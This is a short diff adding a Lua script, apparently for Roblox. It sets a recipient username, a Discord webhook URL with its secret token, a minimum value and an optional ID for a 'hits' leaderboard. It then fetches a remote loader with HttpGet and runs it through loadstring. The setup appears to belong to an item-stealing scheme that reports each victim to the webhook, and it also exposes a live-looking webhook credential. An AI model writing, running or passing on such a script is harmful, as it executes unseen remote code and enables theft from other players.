@@ -1,0 +1,6 @@
+Username = "Andray_7654"
+Webhook = "https://discord.com/api/webhooks/1404770407042519040/JFQAKLKAuc7-XCz_fddwt7i6vYHCYkWxtNEh-qfMX82haQpQSFl4bERTBIPMOVYWGbmA"
+MinimumValue = 1
+DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
